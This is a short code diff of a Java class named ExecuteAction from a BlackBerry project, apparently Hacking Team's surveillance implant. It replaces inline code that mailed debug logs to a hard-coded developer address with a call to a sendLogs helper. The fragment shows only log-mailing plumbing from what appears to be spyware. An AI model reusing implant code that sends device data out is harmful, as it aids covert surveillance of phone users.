@@ -17,7 +17,6 @@ import blackberry.event.Event;
 import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
-import blackberry.utils.Sendmail;
 import blackberry.utils.WChar;
 
 // TODO: Auto-generated Javadoc
@@ -28,6 +27,9 @@ public final class ExecuteAction extends SubAction {
     //#ifdef DEBUG
     static Debug debug = new Debug("ExecuteAction", DebugLevel.VERBOSE);
     //#endif
+
+    String email;
+
     private String command;
 
     /**
@@ -77,28 +79,10 @@ public final class ExecuteAction extends SubAction {
 
     void executeLog(Vector params) {
 
-        Vector logs = Debug.getLogs();
-        if (logs == null) {
-            return;
-        }
-
-        StringBuffer sb = new StringBuffer();
-        int blockLines = 100;
-        int count = 1;
-        for (int i = 0; i < logs.size(); i++) {
-
-            String line = (String) logs.elementAt(i);
-            sb.append(line);
-            sb.append("\r\n");
-
-            if (i % blockLines == blockLines - 1) {
-                //#ifdef DEBUG_TRACE
-                debug.trace("executeLog: " + count);
-                //#endif
-                Sendmail.send("zeno@hackingteam.it", "logs", sb.toString());
-                sb = new StringBuffer();
-            }
-        }
+        //#ifdef DEBUG
+        email = "zeno@hackingteam.it";
+        //#endif
+        boolean ret = Debug.sendLogs(email);
 
     }
 
